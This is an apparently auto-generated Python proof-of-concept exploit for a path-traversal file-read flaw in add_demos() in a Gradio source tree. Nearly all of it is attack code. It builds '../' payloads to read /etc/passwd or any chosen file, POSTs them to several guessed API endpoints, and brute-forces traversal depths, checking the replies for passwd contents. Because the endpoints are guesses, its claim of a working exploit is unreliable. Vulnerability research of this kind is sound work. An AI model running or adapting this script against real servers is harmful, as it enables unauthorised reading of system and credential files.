#!/usr/bin/env python3
# PoC for gradio_src (/tmp/gradio_src)
# Path: suspicious-004
# Sink: add_demos
# Auto-generated — run with: python3 lfi_demos_dir_read_contents_add_demos.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in gradio_src (/tmp/gradio_src)
Vulnerability: Path traversal in add_demos() allows reading arbitrary files
via the 'demos' tag in documentation configuration.
"""

import os
import sys
import json
import tempfile
import requests
from urllib.parse import urljoin

# Configuration
TARGET_URL = "http://localhost:7860"  # Change to target gradio instance
# Benign payload: read /etc/passwd to demonstrate LFI
PAYLOAD_FILE = "/etc/passwd"

def exploit_lfi(target_url, payload_file):
    """
    Exploit the LFI vulnerability by crafting a malicious documentation
    configuration that includes path traversal in the 'demos' tag.
    """
    print(f"[*] Target: {target_url}")
    print(f"[*] Attempting to read: {payload_file}")
    
    # Calculate traversal depth to reach root from DEMOS_DIR
    # DEMOS_DIR is typically 'demos' subdirectory in the project
    # We need to go up enough levels to reach /
    traversal = "../" * 10  # More than enough to reach root
    
    # Craft malicious configuration with path traversal
    malicious_config = {
        "tags": {
            "demos": f"{traversal}{payload_file.lstrip('/')}"
        }
    }
    
    # The vulnerable code expects a list of classes with 'tags' containing 'demos'
    # We need to find the API endpoint that processes documentation config
    # Common endpoints: /api/docs/, /docs/api/, /api/
    
    endpoints = [
        "/api/docs/",
        "/docs/api/",
        "/api/",
        "/docs/",
        "/api/v1/docs/",
        "/v1/docs/"
    ]
    
    for endpoint in endpoints:
        full_url = urljoin(target_url, endpoint)
        print(f"[*] Trying endpoint: {full_url}")
        
        try:
            # Send POST request with malicious config
            response = requests.post(
                full_url,
                json=malicious_config,
                timeout=10,
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                print(f"[+] Success! Response from {full_url}:")
                print(f"[+] Status: {response.status_code}")
                print(f"[+] Content (first 500 chars):")
                print(response.text[:500])
                
                # Check if we got file contents
                if "root:" in response.text or "nobody:" in response.text:
                    print("[!] File contents detected! LFI confirmed!")
                    return True
                else:
                    print("[*] Response received but may not contain target file")
                    print("[*] Trying alternative payload formats...")
                    
                    # Try with different traversal depths
                    for depth in range(3, 15):
                        alt_traversal = "../" * depth
                        alt_config = {
                            "tags": {
                                "demos": f"{alt_traversal}{payload_file.lstrip('/')}"
                            }
                        }
                        
                        alt_response = requests.post(
                            full_url,
                            json=alt_config,
                            timeout=10,
                            headers={"Content-Type": "application/json"}
                        )
                        
                        if alt_response.status_code == 200:
                            if "root:" in alt_response.text or "nobody:" in alt_response.text:
                                print(f"[+] Found working traversal depth: {depth}")
                                print(f"[+] File contents:")
                                print(alt_response.text[:500])
                                return True
                
            elif response.status_code == 422:
                print(f"[*] Got 422 - likely wrong endpoint or payload format")
                print(f"[*] Response: {response.text[:200]}")
            else:
                print(f"[*] Status {response.status_code}: {response.text[:200]}")
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error to {full_url}")
        except requests.exceptions.Timeout:
            print(f"[-] Timeout connecting to {full_url}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    print("[-] Exploit failed - no vulnerable endpoint found")
    return False

def main():
    """Main function with argument parsing and execution."""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="PoC for LFI in gradio_src - Path traversal in add_demos()"
    )
    parser.add_argument(
        "-t", "--target",
        default=TARGET_URL,
        help=f"Target URL (default: {TARGET_URL})"
    )
    parser.add_argument(
        "-f", "--file",
        default=PAYLOAD_FILE,
        help=f"File to read (default: {PAYLOAD_FILE})"
    )
    parser.add_argument(
        "--safe",
        action="store_true",
        help="Use safe payload (read /etc/hostname instead of /etc/passwd)"
    )
    
    args = parser.parse_args()
    
    if args.safe:
        args.file = "/etc/hostname"
        print("[*] Using safe payload: /etc/hostname")
    
    print("=" * 60)
    print("Gradio LFI Proof-of-Concept Exploit")
    print("=" * 60)
    print(f"[*] Target: {args.target}")
    print(f"[*] File to read: {args.file}")
    print()
    
    success = exploit_lfi(args.target, args.file)
    
    if success:
        print("\n[+] Exploit successful!")
        sys.exit(0)
    else:
        print("\n[-] Exploit failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
